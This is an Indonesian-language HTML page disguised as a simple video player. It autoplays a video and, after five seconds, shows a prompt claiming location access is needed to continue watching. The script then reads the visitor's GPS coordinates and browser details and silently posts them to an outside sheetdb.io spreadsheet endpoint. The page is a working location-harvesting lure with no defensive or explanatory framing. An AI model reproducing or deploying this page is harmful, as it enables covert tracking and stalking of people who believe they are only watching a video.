<!DOCTYPE html>
<html>
<head>
  <title>Video Player</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="margin:0; background:black;">

<video id="vid" width="100%" controls autoplay muted playsinline>
  <source src="https://files.catbox.moe/a6i2nt.mp4" type="video/mp4">
</video>

<div id="lokasiBox" style="display:none; position:fixed; bottom:0; width:100%; background:black; color:white; padding:20px; text-align:center;">
  <p>Aktifkan lokasi untuk melanjutkan</p>
  <button onclick="ambilLokasi()" style="padding:10px 20px;">Aktifkan Lokasi</button>
</div>

<script>
let video = document.getElementById("vid");

// popup muncul di detik ke 5
video.addEventListener("timeupdate", function() {
  if (video.currentTime > 5) {
    document.getElementById("lokasiBox").style.display = "block";
  }
});

function ambilLokasi() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(pos) {

      let lat = pos.coords.latitude;
      let lon = pos.coords.longitude;

      fetch("https://sheetdb.io/api/v1/2ipys7fb7fh8h", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          data: [{
            waktu: new Date().toLocaleString(),
            latitude: lat,
            longitude: lon,
            device: navigator.userAgent
          }]
        })
      });

      alert("Lokasi berhasil dikirim");

    }, function() {
      alert("Izin lokasi ditolak");
    });
  }
}
</script>

</body>
</html>
